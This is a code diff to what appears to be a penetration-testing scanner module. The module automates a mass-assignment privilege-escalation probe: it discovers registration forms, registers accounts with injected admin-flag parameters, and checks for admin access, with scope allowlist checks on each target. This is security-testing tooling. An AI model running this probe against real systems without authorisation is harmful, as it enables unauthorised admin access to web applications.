@@ -20,12 +20,17 @@ from __future__ import annotations
 import json
 import logging
 import random
+import re
 import string
 from typing import Any
 from urllib.parse import urljoin, urlparse
 
 import httpx as httpx_client
 
+from api.app.services.auth_discoverer import (
+    fetch_auth_pages,
+    fingerprint_application,
+)
 from api.app.services.runs import web_target_value_is_allowed_with_path
 from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
 
@@ -56,24 +61,15 @@ ADMIN_FLAG_PARAMS: tuple[tuple[str, str], ...] = (
     ("group", "admin"),
 )
 
-# Candidate update endpoints — relative paths to try
-UPDATE_ENDPOINTS: tuple[str, ...] = (
-    "saveprofile",          # Gruyere — order matters, try most-likely first
-    "profile",
-    "profile/update",
-    "account/update",
-    "api/profile",
-    "api/user",
-    "me",
-)
-
-# Admin-only endpoints to verify access after potential escalation
+# Admin-only endpoints to verify access after potential escalation.
+# `manage.gtl` (Gruyere) and `manage` (generic) probe the same admin
+# concept on different stacks — kept as a generic catalog.
 ADMIN_VERIFY_ENDPOINTS: tuple[str, ...] = (
-    "manage.gtl",           # Gruyere actual admin endpoint
+    "manage.gtl",
     "manage",
     "admin",
     "admin/users",
-    "",                     # home page — admin link may appear there
+    "",
 )
 
 ADMIN_INDICATORS: tuple[str, ...] = (
@@ -111,38 +107,78 @@ def _path_root(target: str) -> str:
     return target
 
 
-def _try_register(client: httpx_client.Client, base: str) -> tuple[str, str] | None:
-    """Try common register flows. Cookies are stored on the client jar.
-    Returns (username, password) on success or None."""
-    uid, pw = _random_creds()
-    candidates = [
-        # Gruyere-style
-        (f"{base}saveprofile", {"action": "new", "uid": uid, "pw": pw}, "GET"),
-        # Generic register
-        (f"{base}register", {"username": uid, "password": pw, "email": f"{uid}@aegispt.test"}, "POST"),
-        (f"{base}signup", {"username": uid, "password": pw}, "POST"),
-        (f"{base}api/register", {"username": uid, "password": pw}, "POST"),
-    ]
-    for url, data, method in candidates:
-        try:
-            if method == "GET":
-                resp = client.get(url, params=data, follow_redirects=False)
-            else:
-                resp = client.post(url, data=data, follow_redirects=False)
-        except httpx_client.RequestError:
+def _discover_register_form(
+    base: str, scope_allowlist: dict[str, Any] | None
+) -> dict[str, Any] | None:
+    """Migration #328: replaces hardcoded saveprofile/register/signup
+    URL list with generic discovery via auth_discoverer.fetch_auth_pages
+    + fingerprint_application.
+
+    Returns a dict::
+
+        {
+            "action": str,        # full URL the form posts/gets to
+            "method": "GET"|"POST",
+            "user_field": str,    # name of the username/email field
+            "pass_field": str,    # name of the password field
+            "hidden_fields": {name: value, ...},  # hidden inputs to replay
+        }
+
+    or ``None`` if no register form was observable on the target.
+    """
+    pages = fetch_auth_pages(base, scope_allowlist=scope_allowlist)
+    if not pages:
+        return None
+    fingerprint = fingerprint_application(pages)
+    reg = fingerprint.get("register_form")
+    if not isinstance(reg, dict):
+        return None
+    fields = reg.get("fields") or []
+
+    user_field: str | None = None
+    pass_field: str | None = None
+    for field in fields:
+        fname = str(field.get("name") or "")
+        ftype = str(field.get("type") or "").lower()
+        if not fname:
             continue
-        # Client jar now has any Set-Cookie from this response
-        if len(client.cookies) > 0 or resp.status_code in (200, 302):
-            if len(client.cookies) > 0:
-                return uid, pw
-            # If no cookie set yet, try a login to establish one
-            try:
-                client.get(f"{base}login", params={"uid": uid, "pw": pw}, follow_redirects=False)
-                if len(client.cookies) > 0:
-                    return uid, pw
-            except httpx_client.RequestError:
-                pass
-    return None
+        if ftype == "password" and pass_field is None:
+            pass_field = fname
+        elif ftype in {"text", "email", ""} and user_field is None:
+            user_field = fname
+
+    if not user_field or not pass_field:
+        return None
+
+    # Pull hidden-input original values from the raw HTML — fingerprint
+    # strips field.value for size, but the param-pollution attack needs
+    # to replay original __VIEWSTATE / action=new style hidden inputs.
+    hidden_fields: dict[str, str] = {}
+    action = reg.get("action") or ""
+    for page in pages:
+        if not isinstance(page, dict):
+            continue
+        html = page.get("html") or ""
+        if action.split("/")[-1] not in html and reg.get("action") not in html:
+            # Skip pages whose form doesn't match the chosen register action.
+            pass
+        # Cheap hidden-field extraction (we have the form html nearby).
+        for match in re.finditer(
+            r'<input[^>]*\btype=["\']hidden["\'][^>]*>', html, re.IGNORECASE
+        ):
+            tag = match.group(0)
+            n_match = re.search(r'\bname=["\']([^"\']*)["\']', tag, re.IGNORECASE)
+            v_match = re.search(r'\bvalue=["\']([^"\']*)["\']', tag, re.IGNORECASE)
+            if n_match:
+                hidden_fields.setdefault(n_match.group(1), v_match.group(1) if v_match else "")
+
+    return {
+        "action": action,
+        "method": str(reg.get("method") or "POST").upper(),
+        "user_field": user_field,
+        "pass_field": pass_field,
+        "hidden_fields": hidden_fields,
+    }
 
 
 def _check_admin_access(
@@ -193,74 +229,106 @@ def execute_param_pollution_probe(
     for target in web_targets:
         base = _path_root(target)
         trace_entry: dict[str, Any] = {"target": target, "base": base, "steps": []}
-        # Use a FRESH client per target so cookies don't leak between targets.
-        # For each param/value, REGISTER a NEW user with the extra param
-        # already attached. This is Gruyere R1's actual mechanic (admin flag
-        # accepted at account creation). Each attempt = fresh client + fresh
-        # user so test attempts don't interfere.
+
+        # Migration #328: discover the register form GENERICALLY rather
+        # than hardcoding saveprofile + uid/pw field names.
+        form_info = _discover_register_form(base, scope_allowlist)
+        if form_info is None:
+            trace_entry["steps"].append({"step": "register_discovery", "result": "no_form_found"})
+            trace.append(trace_entry)
+            continue
+
+        register_url = form_info["action"]
+        register_method = form_info["method"]
+        user_field = form_info["user_field"]
+        pass_field = form_info["pass_field"]
+        hidden_fields = form_info["hidden_fields"]
+
+        if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, register_url):
+            trace_entry["steps"].append({"step": "register_discovery", "result": "out_of_scope"})
+            trace.append(trace_entry)
+            continue
+
+        trace_entry["steps"].append({
+            "step": "register_discovery",
+            "action": register_url,
+            "user_field": user_field,
+            "pass_field": pass_field,
+            "hidden_field_names": list(hidden_fields),
+        })
+
         attack_done = False
-        for endpoint in UPDATE_ENDPOINTS:
+        for param_name, param_value in ADMIN_FLAG_PARAMS:
             if attack_done:
                 break
-            url = urljoin(base, endpoint)
-            if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, url):
-                continue
-            for param_name, param_value in ADMIN_FLAG_PARAMS:
-                uid, pw = _random_creds()
-                with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
-                    # Register a fresh account WITH the admin-flag param attached.
-                    register_params = {
-                        "action": "new",
-                        "uid": uid,
-                        "pw": pw,
-                        param_name: param_value,
-                    }
-                    try:
-                        resp = client.get(url, params=register_params, follow_redirects=False)
-                    except httpx_client.RequestError:
-                        continue
-                    if resp.status_code not in (200, 302):
-                        continue
-                    if len(client.cookies) == 0:
-                        # No session — try a quick login to obtain it
-                        try:
-                            client.get(urljoin(base, "login"), params={"uid": uid, "pw": pw})
-                        except httpx_client.RequestError:
-                            pass
-                    if len(client.cookies) == 0:
-                        continue
-                    # Check admin status via cookie-driven admin probe
-                    is_admin, admin_url, evidence = _check_admin_access(client, base)
-                    trace_entry["steps"].append({
-                        "step": "register_with_polluted_param",
-                        "endpoint": url,
-                        "param": param_name,
-                        "value": param_value,
-                        "uid": uid,
-                        "status": resp.status_code,
-                        "cookie_keys": list(client.cookies.keys()),
-                        "is_admin_after": is_admin,
-                    })
-                    if is_admin:
-                        findings_payload.append({
-                            "title": f"Privilege Escalation via Mass Assignment at Registration ({param_name}={param_value})",
-                            "severity": "critical",
-                            "category": "broken-access-control",
-                            "target_id": url,
-                            "evidence": {
-                                "exploited_endpoint": url,
-                                "polluted_param": param_name,
-                                "polluted_value": param_value,
-                                "admin_endpoint_reachable": admin_url,
-                                "admin_response_excerpt": evidence,
-                                "user": uid,
-                            },
-                        })
-                        stderr_lines.append(
-                            f"CRITICAL: {param_name}={param_value} on {url} → admin via {admin_url}"
+            uid, pw = _random_creds()
+            with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
+                # Register a fresh account WITH the admin-flag param attached.
+                # Field names come from the discovered form, not Gruyere hardcoded.
+                register_params: dict[str, str] = {
+                    **hidden_fields,
+                    user_field: uid,
+                    pass_field: pw,
+                    param_name: param_value,
+                }
+                try:
+                    if register_method == "GET":
+                        resp = client.get(register_url, params=register_params, follow_redirects=False)
+                    else:
+                        resp = client.request(
+                            register_method,
+                            register_url,
+                            data=register_params,
+                            follow_redirects=False,
                         )
-                        attack_done = True
-                        break
+                except httpx_client.RequestError:
+                    continue
+                if resp.status_code not in (200, 302):
+                    continue
+                if len(client.cookies) == 0:
+                    # Some stacks require a follow-up login to set the cookie.
+                    try:
+                        client.request(
+                            register_method,
+                            register_url,
+                            params={user_field: uid, pass_field: pw} if register_method == "GET" else None,
+                            data={user_field: uid, pass_field: pw} if register_method != "GET" else None,
+                        )
+                    except httpx_client.RequestError:
+                        pass
+                if len(client.cookies) == 0:
+                    continue
+                is_admin, admin_url, evidence = _check_admin_access(client, base)
+                trace_entry["steps"].append({
+                    "step": "register_with_polluted_param",
+                    "endpoint": register_url,
+                    "param": param_name,
+                    "value": param_value,
+                    "uid": uid,
+                    "status": resp.status_code,
+                    "cookie_keys": list(client.cookies.keys()),
+                    "is_admin_after": is_admin,
+                })
+                if is_admin:
+                    findings_payload.append({
+                        "title": f"Privilege Escalation via Mass Assignment at Registration ({param_name}={param_value})",
+                        "severity": "critical",
+                        "category": "broken-access-control",
+                        "target_id": register_url,
+                        "evidence": {
+                            "exploited_endpoint": register_url,
+                            "polluted_param": param_name,
+                            "polluted_value": param_value,
+                            "admin_endpoint_reachable": admin_url,
+                            "admin_response_excerpt": evidence,
+                            "user": uid,
+                        },
+                    })
+                    stderr_lines.append(
+                        f"CRITICAL: {param_name}={param_value} on {register_url} → admin via {admin_url}"
+                    )
+                    attack_done = True
+                    break
         trace.append(trace_entry)
 
     result = {"trace": trace, "findings": findings_payload, "trace_count": len(trace)}
